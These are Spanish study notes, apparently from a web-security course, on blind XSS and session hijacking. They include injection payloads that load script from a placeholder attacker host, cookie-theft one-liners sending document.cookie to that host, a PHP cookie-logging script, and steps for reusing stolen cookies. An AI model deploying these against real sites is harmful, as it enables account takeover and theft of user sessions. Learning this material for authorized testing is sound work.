
### Session Hijacking y Blind XSS

#### **Concepto de Session Hijacking**

- Las aplicaciones web modernas usan cookies para mantener la sesión activa entre diferentes sesiones de navegación.
- Si un atacante obtiene estas cookies, puede acceder a la cuenta de la víctima sin necesidad de conocer las credenciales.
- Mediante la ejecución de código JavaScript en el navegador de la víctima, es posible capturar las cookies y enviarlas al servidor del atacante, lo que facilita un ataque de _Session Hijacking_.

---

#### **Blind XSS**

- **Blind XSS** ocurre cuando la vulnerabilidad se ejecuta en una página a la que no tenemos acceso directo, como paneles de administración.
- Ejemplos comunes incluyen formularios de contacto, reseñas, detalles de usuario, tickets de soporte o encabezados HTTP como `User-Agent`.

---

#### **Detección de Blind XSS**

1. **Problema**: No podemos visualizar cómo se procesa nuestra entrada en el backend o en el navegador del admin.
2. **Solución**:
    - Usar un _payload_ de JavaScript que envíe una solicitud HTTP a nuestro servidor. Si recibimos la solicitud, sabemos que la página es vulnerable.
    - Para identificar el campo vulnerable, podemos personalizar el nombre del archivo de script solicitado:
        
        ```html
        <script src="http://OUR_IP/username"></script>
        ```
        
        Si recibimos una solicitud a `/username`, el campo `username` es vulnerable.

---

#### **Payloads comunes para Blind XSS**

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

---

#### **Configuración del servidor para pruebas**

1. Crear un servidor temporal:
    
    ```bash
    mkdir /tmp/tmpserver
    cd /tmp/tmpserver
    sudo php -S 0.0.0.0:80
    ```
    
2. Inyectar los payloads en diferentes campos, incluyendo el nombre del campo en la URL del script:
    
    ```html
    <script src=http://OUR_IP/fullname></script>
    <script src=http://OUR_IP/username></script>
    ```
    
3. Identificar los campos vulnerables al recibir solicitudes en el servidor.

---

#### **Explotación de XSS para Session Hijacking**

1. **Payloads para robar cookies**:
    
    ```javascript
    document.location='http://OUR_IP/index.php?c='+document.cookie;
    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
    ```
    
    - Se prefiere el segundo payload, ya que es menos sospechoso.
2. **Script PHP para capturar cookies**:
    
    ```php
    <?php
    if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
            $cookie = urldecode($value);
            $file = fopen("cookies.txt", "a+");
            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
            fclose($file);
        }
    }
    ?>
    ```
    
    - Este script escribe las cookies capturadas en un archivo `cookies.txt`.
3. **Visualización de cookies capturadas**:
    
    - Las cookies se almacenan en `cookies.txt` con la IP y el valor de la cookie.

---

#### **Uso de las cookies robadas**

1. Abrir la página de inicio de sesión en el navegador.
2. Usar las herramientas de desarrollo (Shift+F9 en Firefox) para añadir manualmente la cookie:
    - **Nombre**: Parte antes del `=`.
    - **Valor**: Parte después del `=`.
3. Refrescar la página para acceder a la sesión de la víctima.

---

### **Resumen**

El ataque de _Session Hijacking_ aprovecha vulnerabilidades de XSS (especialmente _Blind XSS_) para capturar cookies y acceder a sesiones autenticadas. Mediante scripts remotos, un servidor temporal y un script PHP para registrar cookies, es posible identificar campos vulnerables y explotar estas vulnerabilidades para obtener acceso no autorizado.